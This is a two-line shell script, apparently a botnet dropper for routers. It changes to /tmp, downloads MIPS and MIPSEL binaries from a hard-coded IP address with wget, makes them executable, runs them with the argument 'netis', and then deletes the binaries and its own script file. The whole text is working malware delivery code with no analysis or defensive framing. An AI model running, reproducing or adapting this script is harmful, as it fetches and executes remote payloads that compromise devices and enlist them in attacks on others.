#!/bin/sh
cd /tmp;wget http://45.95.146.126/splmips; chmod 777 *;./splmips netis;rm -rf splmips;rm -rf sys.sh
cd /tmp;wget http://45.95.146.126/splmpsl; chmod 777 *;./splmpsl netis;rm -rf splmpsl;rm -rf sys.sh

